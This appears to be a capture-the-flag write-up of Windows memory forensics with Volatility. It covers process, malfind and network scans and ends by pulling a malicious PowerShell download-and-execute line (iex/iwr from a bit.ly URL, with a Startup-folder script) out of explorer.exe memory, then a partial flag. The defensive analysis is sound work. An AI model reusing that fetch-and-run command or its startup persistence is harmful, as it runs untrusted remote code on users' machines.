We have a memory dump of Windows filesystem, and taking a look to available tools we find volatility.
```
python vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw imageinfo

INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/lotape6/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80001a540a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80001a55d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-10-27 14:26:09 UTC+0000
     Image local date and time : 2020-10-27 19:56:09 +0530

# Retrieve files
python vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw --profile Win7SP1x64 filescan

```
Let's get the latest version of volatility and start over:
```
   windows.amcache.Amcache
                        Extract information on executed applications from the
                        AmCache.
    windows.bigpools.BigPools
                        List big page pools.
    windows.cachedump.Cachedump
                        Dumps lsa secrets from memory
    windows.callbacks.Callbacks
                        Lists kernel callbacks and notification routines.
    windows.cmdline.CmdLine
                        Lists process command line arguments.
    windows.cmdscan.CmdScan
                        Looks for Windows Command History lists
    windows.consoles.Consoles
                        Looks for Windows console buffers
    windows.crashinfo.Crashinfo
                        Lists the information from a Windows crash dump.
    windows.debugregisters.DebugRegisters
    windows.devicetree.DeviceTree
                        Listing tree based on drivers and attached devices in
                        a particular windows memory image.
    windows.dlllist.DllList
                        Lists the loaded modules in a particular windows
                        memory image.
    windows.driverirp.DriverIrp
                        List IRPs for drivers in a particular windows memory
                        image.
    windows.drivermodule.DriverModule
                        Determines if any loaded drivers were hidden by a
                        rootkit
    windows.driverscan.DriverScan
                        Scans for drivers present in a particular windows
                        memory image.
    windows.dumpfiles.DumpFiles
                        Dumps cached file contents from Windows memory
                        samples.
    windows.envars.Envars
                        Display process environment variables
    windows.filescan.FileScan
                        Scans for file objects present in a particular windows
                        memory image.
    windows.getservicesids.GetServiceSIDs
                        Lists process token sids.
    windows.getsids.GetSIDs
                        Print the SIDs owning each process
    windows.handles.Handles
                        Lists process open handles.
    windows.hashdump.Hashdump
                        Dumps user hashes from memory
    windows.hollowprocesses.HollowProcesses
                        Lists hollowed processes
    windows.iat.IAT     Extract Import Address Table to list API (functions)
                        used by a program contained in external libraries
    windows.info.Info   Show OS & kernel details of the memory sample being
                        analyzed.
    windows.joblinks.JobLinks
                        Print process job link information
    windows.kpcrs.KPCRs
                        Print KPCR structure for each processor
    windows.ldrmodules.LdrModules
                        Lists the loaded modules in a particular windows
                        memory image.
    windows.lsadump.Lsadump
                        Dumps lsa secrets from memory
    windows.malfind.Malfind
                        Lists process memory ranges that potentially contain
                        injected code.
    windows.mbrscan.MBRScan
                        Scans for and parses potential Master Boot Records
                        (MBRs)
    windows.memmap.Memmap
                        Prints the memory map
    windows.mftscan.ADS
                        Scans for Alternate Data Stream
    windows.mftscan.MFTScan
                        Scans for MFT FILE objects present in a particular
                        windows memory image.
    windows.modscan.ModScan
                        Scans for modules present in a particular windows
                        memory image.
    windows.modules.Modules
                        Lists the loaded kernel modules.
    windows.mutantscan.MutantScan
                        Scans for mutexes present in a particular windows
                        memory image.
    windows.netscan.NetScan
                        Scans for network objects present in a particular
                        windows memory image.
    windows.netstat.NetStat
                        Traverses network tracking structures present in a
                        particular windows memory image.
    windows.orphan_kernel_threads.Threads
                        Lists process threads
    windows.pe_symbols.PESymbols
                        Prints symbols in PE files in process and kernel
                        memory
    windows.pedump.PEDump
                        Allows extracting PE Files from a specific address in
                        a specific address space
    windows.poolscanner.PoolScanner
                        A generic pool scanner plugin.
    windows.privileges.Privs
                        Lists process token privileges
    windows.processghosting.ProcessGhosting
                        Lists processes whose DeletePending bit is set or
                        whose FILE_OBJECT is set to 0
    windows.pslist.PsList
                        Lists the processes present in a particular windows
                        memory image.
    windows.psscan.PsScan
                        Scans for processes present in a particular windows
                        memory image.
    windows.pstree.PsTree
                        Plugin for listing processes in a tree based on their
                        parent process ID.
    windows.psxview.PsXView
                        Lists all processes found via four of the methods
--
                        looking at this plugin's output in a terminal.
    windows.registry.certificates.Certificates
                        Lists the certificates in the registry's Certificate
                        Store.
    windows.registry.getcellroutine.GetCellRoutine
                        Reports registry hives with a hooked GetCellRoutine
                        handler
    windows.registry.hivelist.HiveList
                        Lists the registry hives present in a particular
                        memory image.
    windows.registry.hivescan.HiveScan
                        Scans for registry hives present in a particular
                        windows memory image.
    windows.registry.printkey.PrintKey
                        Lists the registry keys under a hive or specific key
                        value.
    windows.registry.userassist.UserAssist
                        Print userassist registry keys and information.
    windows.scheduled_tasks.ScheduledTasks
                        Decodes scheduled task information from the Windows
--
                        actions, run times, and creation times.
    windows.sessions.Sessions
                        lists Processes with Session information extracted
                        from Environmental Variables
    windows.shimcachemem.ShimcacheMem
                        Reads Shimcache entries from the ahcache.sys AVL tree
    windows.skeleton_key_check.Skeleton_Key_Check
                        Looks for signs of Skeleton Key malware
    windows.ssdt.SSDT   Lists the system call table.
    windows.statistics.Statistics
                        Lists statistics about the memory space.
    windows.strings.Strings
                        Reads output from the strings command and indicates
                        which process(es) each string belongs to.
    windows.suspicious_threads.SuspiciousThreads
                        Lists suspicious userland process threads
    windows.svcdiff.SvcDiff
                        Compares services found through list walking versus
                        scanning to find rootkits
    windows.svclist.SvcList
                        Lists services contained with the services.exe doubly
                        linked list of services
    windows.svcscan.SvcScan
                        Scans for windows services.
    windows.symlinkscan.SymlinkScan
                        Scans for links present in a particular windows memory
                        image.
    windows.thrdscan.ThrdScan
                        Scans for windows threads.
    windows.threads.Threads
                        Lists process threads
    windows.timers.Timers
                        Print kernel timers and associated module DPCs
    windows.truecrypt.Passphrase
                        TrueCrypt Cached Passphrase Finder
    windows.unhooked_system_calls.unhooked_system_calls
                        Looks for signs of Skeleton Key malware
    windows.unloadedmodules.UnloadedModules
                        Lists the unloaded kernel modules.
    windows.vadinfo.VadInfo
                        Lists process memory ranges.
    windows.vadwalk.VadWalk
                        Walk the VAD tree.
    windows.vadyarascan.VadYaraScan
                        Scans all the Virtual Address Descriptor memory maps
                        using yara.
    windows.verinfo.VerInfo
                        Lists version information from PE files.
    windows.virtmap.VirtMap
                        Lists virtual mapped sections.

```

```
python3 vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw windows.filescan.FileScan

# Nothing interesting so far

python3 vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw windows.cmdline.CmdLine

# It looks like taskhost.exe is being running, but it's not running from system32 folder, so it may be malicious

# After running the next command, it looks like it's fine 
python3 vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw windows.pstree.PsTree

# Let's find some potential malicious process
python3 vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw windows.malfind.Malfind

# Potentially malicious executables:
explorer.exe
WmiPrvSE.exe 
PID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Notes   Hexdump Disasm

1948    WmiPrvSE.exe    0x17f0000       0x186ffff       VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled        N/A
00 00 00 00 00 00 00 00 d9 f7 93 e6 4c 53 00 01 ............LS..
ee ff ee ff 00 00 00 00 28 01 7f 01 00 00 00 00 ........(.......
28 01 7f 01 00 00 00 00 00 00 7f 01 00 00 00 00 (...............
00 00 7f 01 00 00 00 00 80 00 00 00 00 00 00 00 ................
0x17f0000:      add     byte ptr [rax], al
0x17f0002:      add     byte ptr [rax], al
0x17f0004:      add     byte ptr [rax], al
0x17f0006:      add     byte ptr [rax], al
0x17f0008:      fincstp
0x17f000a:      xchg    ebx, eax
0x17f000b:      out     0x4c, al
0x17f000d:      push    rbx
0x17f000e:      add     byte ptr [rcx], al
0x17f0010:      out     dx, al
808     explorer.exe    0x23f0000       0x23fffff       VadS    PAGE_EXECUTE_READWRITE  16      1       Disabled        N/A
41 ba 80 00 00 00 48 b8 38 a1 f7 ff fe 07 00 00 A.....H.8.......
48 ff 20 90 41 ba 81 00 00 00 48 b8 38 a1 f7 ff H. .A.....H.8...
fe 07 00 00 48 ff 20 90 41 ba 82 00 00 00 48 b8 ....H. .A.....H.
38 a1 f7 ff fe 07 00 00 48 ff 20 90 41 ba 83 00 8.......H. .A...
0x23f0000:      mov     r10d, 0x80
0x23f0006:      movabs  rax, 0x7fefff7a138
0x23f0010:      jmp     qword ptr [rax]
0x23f0013:      nop
0x23f0014:      mov     r10d, 0x81
0x23f001a:      movabs  rax, 0x7fefff7a138
0x23f0024:      jmp     qword ptr [rax]
0x23f0027:      nop
0x23f0028:      mov     r10d, 0x82
0x23f002e:      movabs  rax, 0x7fefff7a138
0x23f0038:      jmp     qword ptr [rax]
0x23f003b:      nop
808     explorer.exe    0x27b0000       0x27b0fff       VadS    PAGE_EXECUTE_READWRITE  1       1       Disabled        N/A
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
00 00 7b 02 00 00 00 00 00 00 00 00 00 00 00 00 ..{.............
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x27b0000:      add     byte ptr [rax], al


# Also we check the connections to see if there is something strange 

python3 vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw windows.netscan

# And we find something strange:
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
0x1e6d4010      TCPv4   -       0       56.107.22.8     0       CLOSED  964     svchost.exe     N/A

# Nothing over there
# Let's get back to explorer.exe
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

0       189540986793649 F       0x44a00b8       0       -       -       False   2020-10-27 13:13:24.000000 UTC  2020-10-27 13:13:24.000000 UTC  Disabled
808     1860    explorer.exe    0x1e632530      20      521     1       False   2020-10-27 14:22:10.000000 UTC  N/A     Disabled


# As we don't trust the explorer executable, we are going to dump the memory of the process:
python3 vol.py -f ~/resources/hack/htb/tracks/intro_to_blue_team/Export/WIN-LQS146OE2S1-20201027-142607.raw  -o "explorerdump" windows.memmap --dump --pid 808

# And now it's time to take a look to the strings contained in the exe, and we dind something quite strange:

iex(iwr "http%3A%2F%2Fbit.ly%2FSFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30%3D.ps1")  Menu\Programs\Startup\3usy12fv.ps1


#After some URL and base64 decode we obtain the flag!
HTB{W1Nd0...
```

